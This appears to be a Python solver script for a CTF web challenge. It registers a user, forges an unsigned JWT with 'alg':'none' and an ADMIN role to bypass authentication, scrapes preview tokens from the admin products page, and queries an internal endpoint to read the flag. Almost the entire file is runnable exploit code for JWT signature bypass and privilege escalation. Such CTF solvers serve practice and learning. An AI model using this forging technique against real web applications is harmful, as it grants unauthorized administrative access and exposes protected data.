#!/usr/bin/env python3
"""
z0d1akCTF 2026 Qualifiers - Web Exploitation - Sprout & About.

The application stores the session in a JWT.  Its verifier accepts unsigned
tokens when the header says {"alg":"none"}, so we register a normal account,
forge an ADMIN session, scrape a product preview token from /admin/products,
and call the internal preview context endpoint that exposes the flag.
"""

from __future__ import annotations

import argparse
import base64
import json
import re
import time
import urllib.error
import urllib.parse
import urllib.request
from http.cookiejar import CookieJar
from typing import Any


DEFAULT_BASE_URL = "https://sprout-about-43e04b91a1cd.chals.z0d1ak.org"


def b64url_json(value: dict[str, Any]) -> str:
    raw = json.dumps(value, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def decode_jwt_part(part: str) -> dict[str, Any]:
    padded = part + "=" * (-len(part) % 4)
    return json.loads(base64.urlsafe_b64decode(padded))


class Client:
    def __init__(self, base_url: str) -> None:
        self.base_url = base_url.rstrip("/")
        self.jar = CookieJar()
        class NoRedirect(urllib.request.HTTPRedirectHandler):
            def redirect_request(self, *args: Any, **kwargs: Any) -> None:
                return None

        self.opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(self.jar),
            NoRedirect,
        )

    def request(
        self,
        method: str,
        path: str,
        *,
        data: dict[str, str] | None = None,
        cookie: str | None = None,
    ) -> tuple[int, bytes, str | None]:
        url = self.base_url + path
        body = None
        headers = {"user-agent": "sprout-solver/1.0"}

        if data is not None:
            body = urllib.parse.urlencode(data).encode()
            headers["content-type"] = "application/x-www-form-urlencoded"
        if cookie is not None:
            headers["cookie"] = cookie

        req = urllib.request.Request(url, data=body, headers=headers, method=method)
        try:
            with self.opener.open(req, timeout=15) as resp:
                return resp.status, resp.read(), resp.headers.get("location")
        except urllib.error.HTTPError as exc:
            return exc.code, exc.read(), exc.headers.get("location")

    def get_cookie_value(self, name: str) -> str:
        for cookie in self.jar:
            if cookie.name == name:
                return cookie.value
        raise RuntimeError(f"missing cookie {name!r}")


def register_user(client: Client) -> str:
    # The registration form rejects non-sproutabout.com email addresses and
    # passwords that are not exactly twelve characters long.
    email = f"codax{int(time.time())}@sproutabout.com"
    password = "Codax1234567"
    status, _, location = client.request(
        "POST",
        "/api/auth/register",
        data={"email": email, "password": password},
    )
    if status != 307 or not location or "/shop" not in location:
        raise RuntimeError(f"registration failed: HTTP {status}, location={location}")
    return client.get_cookie_value("sprout_session")


def forge_admin_jwt(user_token: str) -> str:
    payload = decode_jwt_part(user_token.split(".")[1])
    now = int(time.time())
    forged_payload = {
        "sub": "1",
        "email": "admin@sprout.local",
        "role": "ADMIN",
        "iat": payload.get("iat", now),
        "exp": max(int(payload.get("exp", now + 21600)), now + 3600),
    }
    return (
        b64url_json({"alg": "none", "typ": "JWT"})
        + "."
        + b64url_json(forged_payload)
        + "."
    )


def extract_preview_tokens(admin_products_html: str) -> list[tuple[int, str, str]]:
    # The page is a Next.js RSC response embedded in script tags; JSON strings
    # appear both escaped and unescaped depending on the hydration fragment.
    normalized = admin_products_html.replace(r"\"", '"')
    pattern = re.compile(
        r'productId":(\d+),"previewToken":"([^"]+)","name":"([^"]+)"'
    )
    tokens: list[tuple[int, str, str]] = []
    seen: set[tuple[int, str]] = set()

    for match in pattern.finditer(normalized):
        product_id = int(match.group(1))
        preview_token = match.group(2)
        name = match.group(3)
        key = (product_id, preview_token)
        if key not in seen:
            seen.add(key)
            tokens.append((product_id, preview_token, name))

    if not tokens:
        raise RuntimeError("no preview tokens found in /admin/products")
    return tokens


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "base_url",
        nargs="?",
        default=DEFAULT_BASE_URL,
        help="challenge instance base URL",
    )
    args = parser.parse_args()

    client = Client(args.base_url)
    user_token = register_user(client)
    header = decode_jwt_part(user_token.split(".")[0])
    payload = decode_jwt_part(user_token.split(".")[1])
    print(f"[+] registered user session: alg={header['alg']} role={payload['role']}")

    admin_token = forge_admin_jwt(user_token)
    admin_cookie = f"sprout_session={admin_token}"
    status, body, _ = client.request("GET", "/admin/products", cookie=admin_cookie)
    if status != 200:
        raise RuntimeError(f"forged ADMIN session failed: HTTP {status}")

    tokens = extract_preview_tokens(body.decode(errors="replace"))
    product_id, preview_token, name = tokens[0]
    print(f"[+] using preview token for product {product_id}: {name}")

    query = urllib.parse.urlencode(
        {"productId": str(product_id), "previewToken": preview_token}
    )
    status, body, _ = client.request(
        "GET", f"/api/admin/preview-context?{query}", cookie=admin_cookie
    )
    if status != 200:
        raise RuntimeError(f"preview context failed: HTTP {status} {body!r}")

    context = json.loads(body)
    print(f"[+] preview context: {json.dumps(context, sort_keys=True)}")
    print(context["finalFlag"])


if __name__ == "__main__":
    main()
